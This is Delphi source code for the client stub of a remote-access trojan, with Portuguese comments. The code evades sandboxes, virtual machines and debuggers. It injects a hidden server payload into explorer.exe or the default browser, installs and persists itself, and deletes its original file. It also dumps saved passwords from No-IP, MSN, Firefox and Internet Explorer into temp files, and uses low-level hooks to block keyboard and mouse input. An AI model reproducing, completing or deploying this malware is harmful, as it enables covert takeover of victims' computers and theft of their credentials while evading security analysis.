program STUB;

uses
  windows,
  UnitInjectLibrary,
  UnitVariaveis,
  UnitServerUtils,
  UnitSettings,
  UnitSandBox,
  UnitDiversos,
  UnitInstalacao,
  EditSvr,
  UnitPasswords,
  DeleteUnit,
  Messages;

var
  MyMutex: THandle;
  TempFileName: string;

type
    KeybdLLHookStruct = record
      vkCode      : cardinal;
      scanCode    : cardinal;
      flags       : cardinal;
      time        : cardinal;
      dwExtraInfo : cardinal;
    end;
    MouseLLHookStruct = record
      pt          : TPoint;
      mouseData   : cardinal;
      flags       : cardinal;
      time        : cardinal;
      dwExtraInfo : cardinal;
    end;
    
const
  wh_keybd_ll = 13;
  wh_mouse_ll = 14;

var
  kHook, mHook: HHook;

function LowLevelKeybdHookProc(nCode, wParam, lParam : integer) : integer;
var
  info : ^KeybdLLHookStruct absolute lParam;
  lpChar : word;
  kState : TKeyboardState;
begin
  result := 1;
  with info^ do
  case wParam of
    wm_keydown :
    begin
      GetKeyboardState(kState);
      if ToAscii(vkCode, scanCode, kState, @lpChar, 0) > 0 then ;
    end;
  end;
end;

function LowLevelMouseHookProc(nCode, wParam, lParam : integer) : integer; 
var
  info : ^MouseLLHookStruct absolute lParam;
begin
  result := 1;
  with info^ do
  case wParam of
    wm_lbuttondown : ;
    wm_lbuttonup   : ;
    wm_mbuttondown : ;
    wm_mbuttonup   : ;
    wm_rbuttondown : ;
    wm_rbuttonup   : ;
    wm_mousewheel  : ;
  end;
end;

procedure IniciarVerificacaoDebugger;
var
  intStartTime: integer;
begin
  if AntiSandieBox = true then if Sandboxie = true then ExitProcess(0);
  if AntiVPC = true then if IsInVPC = true then ExitProcess(0);
  if AntiVMWare = true then if InVMware = true then ExitProcess(0);
  if AntiVirtualBox = true then if InVirtualBox = true then ExitProcess(0);
  if AntiThreatExpert = true then if ThreadExpert = true then ExitProcess(0);
  if AntiAnubis = true then if Anubis = true then ExitProcess(0);
  if AntiCWSandbox = true then if CWSandbox = true then ExitProcess(0);
  if AntiJoeBox = true then if JoeBox = true then ExitProcess(0);
  if AtiNormamSandbox = true then if NormanSandBox = true then ExitProcess(0);
  if AntiSoftIce = true then if IsSoftIce = true then ExitProcess(0);
  if AntiDebugger = true then if IsInDebugger = true then ExitProcess(0);

  if Outros = true then
  begin
    intStartTime := GetTickCount;
    if IsBPX(@IsInVPC) then ExitProcess(0);
    if IsBPX(@InVirtualBox) then ExitProcess(0);
    if IsBPX(@Sandboxie) then ExitProcess(0);
    if IsBPX(@ThreadExpert) then ExitProcess(0);
    if IsBPX(@JoeBox) then ExitProcess(0);
    if IsBPX(@CWSandbox) then ExitProcess(0);
    if IsBPX(@Anubis) then ExitProcess(0);
    if IsBPX(@NormanSandBox) then ExitProcess(0);
    if IsBPX(@IsODBGLoaded) then ExitProcess(0);
    if IsBPX(@FoolProcDump) then ExitProcess(0);
    if IsBPX(@SyserDebugger) then ExitProcess(0);
    if IsBPX(@IsSoftIce) then ExitProcess(0);
    if IsBPX(@IsInDebugger) then ExitProcess(0);
    if IsBPX(@InVMware) then ExitProcess(0);
    if IsODBGLoaded = true then ExitProcess(0);
  end;
  if Outros = true then
  begin
    FoolProcDump;
    if ((GetTickCount() - intStartTime) > 5000) then ExitProcess(0);
  end;
end;

Procedure IniciarInjection;
var
  ProcessHandle: longword;
  PID: longword;
  ResourcePointer: pointer;
  ProcInfo: TProcessInformation;
  StartInfo: TStartupInfo;
  DeuCerto: boolean;
  ProcessPID: integer;
begin
  ResourcePointer := @ServerBuffer[1];
  DeuCerto := false;

  if WhereInject = 2 then
  begin
    if lowerstring(InjectIntoString) = 'explorer.exe' then
    begin
      if persist = true then
      begin
        ZeroMemory(@StartInfo, SizeOf(StartupInfo));
        ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
        CreateProcess(nil, pchar('explorer.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
        processhandle := ProcInfo.hProcess;
        DeuCerto := InjectPointerLibrary(ProcessHandle, ResourcePointer);
      end else
      begin
        GetWindowThreadProcessId(FindWindow('shell_traywnd', nil), @PID);  //explorer.exe
        ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
        if InjectPointerLibrary(ProcessHandle, ResourcePointer) = false then
        begin
          ZeroMemory(@StartInfo, SizeOf(StartupInfo));
          ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
          CreateProcess(nil, pchar('explorer.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
          processhandle := ProcInfo.hProcess;
          DeuCerto := InjectPointerLibrary(ProcessHandle, ResourcePointer);
        end else DeuCerto := true;
      end;
    end else
    begin
      if ProcessExists(InjectIntoString, ProcessPID) = true then
        InjectIntoString := ProcessFileName(ProcessPID) else InjectIntoString := getdefaultbrowser;
      ZeroMemory(@StartInfo, SizeOf(StartupInfo));
      ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
      CreateProcess(pchar(InjectIntoString), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      processhandle := ProcInfo.hProcess;
      DeuCerto := InjectPointerLibrary(ProcessHandle, ResourcePointer);
    end;
    if deucerto = false then
    begin
      InjectIntoString := paramstr(0);
      ZeroMemory(@StartInfo, SizeOf(StartupInfo));
      ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
      CreateProcess(pchar(InjectIntoString), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      processhandle := ProcInfo.hProcess;
      DeuCerto := InjectPointerLibrary(ProcessHandle, ResourcePointer);
    end;
  end else
  if WhereInject = 1 then
  begin
    InjectIntoString := getdefaultbrowser;
    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
    CreateProcess(pchar(InjectIntoString), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    processhandle := ProcInfo.hProcess;
    DeuCerto := InjectPointerLibrary(ProcessHandle, ResourcePointer);
    if DeuCerto = false then
    begin
      InjectIntoString := paramstr(0);
      ZeroMemory(@StartInfo, SizeOf(StartupInfo));
      ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
      CreateProcess(pchar(InjectIntoString), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      processhandle := ProcInfo.hProcess;
      DeuCerto := InjectPointerLibrary(ProcessHandle, ResourcePointer);
    end;
  end else
  begin
    if (MeltOriginalFile = true) and (TempFileName <> paramstr(0)) then
    begin
      MyShellExecute(0, 'open', pchar(TempFileName), '', '', sw_hide);
      deletarse;
      exitprocess(0);
    end;

    InjectIntoString := paramstr(0);
    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
    CreateProcess(pchar(InjectIntoString), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    processhandle := ProcInfo.hProcess;
    DeuCerto := InjectPointerLibrary(ProcessHandle, ResourcePointer);
  end;
end;

Procedure IniciarInjectionPersist;
var
  ProcessHandle: longword;
  PID: longword;
  ResourcePointer: pointer;
  ProcInfo: TProcessInformation;
  StartInfo: TStartupInfo;
  TempMutex: THandle;
begin
  TempMutex := CreateMutex(nil, False, pchar(MutexName + '_PERSIST'));
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    CloseHandle(TempMutex);
    exit;
  end else closehandle(TempMutex);

  ResourcePointer := @ServerBuffer[1];

  GetWindowThreadProcessId(FindWindow('Shell_TrayWnd', nil), @PID);
  ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
  if InjectPointerLibrary(ProcessHandle, ResourcePointer) = false then
  begin
    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
    CreateProcess(nil, pchar('explorer.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    processhandle := ProcInfo.hProcess;
    InjectPointerLibrary(ProcessHandle, ResourcePointer);
  end;
end;

procedure CriarSettingsFile(OndeInstalou, OndeCriar: string);
var
  i: integer;
  Settingsn: string;
begin
  Settingsn := paramstr(0) + '|'; // diz para o server qual arquivo vai deletar se melt = true
  Settingsn := Settingsn + OndeInstalou + '|'; // diz para o server onde foi instalado

  for i := 0 to High(variaveis) do
  begin
    if (variaveis[i] <> '') and (variaveis[i] <> ' ') then
     Settingsn := Settingsn + Encrypt(variaveis[i]) + EditSvrID else
     Settingsn := Settingsn + ' ' + EditSvrID;
  end;



  // a função original dava falha no último item, pois deletava o último char.
  // Então acrescentei mais um ID, como se fosse mai um item e deu certo
  Settingsn := Settingsn + ' ' + EditSvrID;

  CriarArquivo(OndeCriar, Settingsn, length(Settingsn));
end;

function PossoFinalizarMouse: boolean;
var
  TempMutex: THandle;
begin
  TempMutex := CreateMutex(nil, False, '_x_X_BLOCKMOUSE_X_x_');
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    Closehandle(TempMutex);
    result := false;
  end else
  begin
    Closehandle(TempMutex);
    Result := true;
  end;
end;

var
  TempStr: string;
  TempMutex: cardinal;

begin
  TempMutex := CreateMutex(nil, False, '_x_X_UPDATE_X_x_');
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    CloseHandle(TempMutex);
    sleep(12000);  // é o tempo necessário para o servidor finalizar as threads o fechar o mutex_sair
  end else closehandle(TempMutex);

  TempMutex := CreateMutex(nil, False, '_x_X_PASSWORDLIST_X_x_');
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    CloseHandle(TempMutex);
    TempStr := noip_DUCpasswords;
    if TempStr <> '' then CriarArquivo(MyTempFolder + 'NOIP.abc', TempStr, length(TempStr));

    TempStr := GetWindowsLiveMessengerPasswords;
    if TempStr <> '' then CriarArquivo(MyTempFolder + 'MSN.abc', TempStr, length(TempStr));

    TempStr := GetFirefoxPasswords;
    if TempStr <> '' then CriarArquivo(MyTempFolder + 'FIREFOX.abc', TempStr, length(TempStr));

    TempStr := GetIELoginPass;
    if TempStr <> '' then CriarArquivo(MyTempFolder + 'IELOGIN.abc', TempStr, length(TempStr));

    TempStr := GrabAllIEpasswords;
    if TempStr <> '' then CriarArquivo(MyTempFolder + 'IEPASS.abc', TempStr, length(TempStr));

    TempStr := ShowAllIeAutocompletePWs;
    if TempStr <> '' then CriarArquivo(MyTempFolder + 'IEAUTO.abc', TempStr, length(TempStr));

    TempStr := ShowAllIEWebCert;
    if TempStr <> '' then CriarArquivo(MyTempFolder + 'IEWEB.abc', TempStr, length(TempStr));

    exit;
  end else closehandle(TempMutex);

  TempMutex := CreateMutex(nil, False, '_x_X_BLOCKMOUSE_X_x_');
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    Closehandle(TempMutex);
    khook := SetWindowsHookEx(wh_keybd_ll, @LowLevelKeybdHookProc, hInstance, 0);
    mHook := SetWindowsHookEx(wh_mouse_ll, @LowLevelMouseHookProc, hInstance, 0);
    while PossoFinalizarMouse = false do ProcessMessages;
    exitprocess(0);
  end else closehandle(TempMutex);

  if paramstr(1) <> 'Restart' then sleep(1000);

  LerConfigs;
  GetFirstSettings;

  IniciarVerificacaoDebugger;

  // aqui serve para ter certeza que o servidor está em execução.
  MyMutex := CreateMutex(nil, False, pchar(MutexName));
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    closehandle(MyMutex);
    sleep(1000);
    MyMutex := CreateMutex(nil, False, pchar(MutexName));
    if GetLastError = ERROR_ALREADY_EXISTS then
    begin
      closehandle(MyMutex);
      sleep(1000);
      MyMutex := CreateMutex(nil, False, pchar(MutexName));
      if GetLastError = ERROR_ALREADY_EXISTS then
      begin
        closehandle(MyMutex);
        sleep(1000);
        MyMutex := CreateMutex(nil, False, pchar(MutexName));
        if GetLastError = ERROR_ALREADY_EXISTS then exitprocess(0) else closehandle(MyMutex);
      end else closehandle(MyMutex);
    end else closehandle(MyMutex);
  end else closehandle(MyMutex);

  if InstalarServidor = true then
  TempFileName := InstallServer(paramstr(0)) else TempFileName := paramstr(0);

  CriarSettingsFile(TempFileName, MyTempFolder + 'XX--XX--XX.txt');

  if persist = true then
  begin
    IniciarInjectionPersist;
    sleep(1000);
  end;

  IniciarInjection;
end.
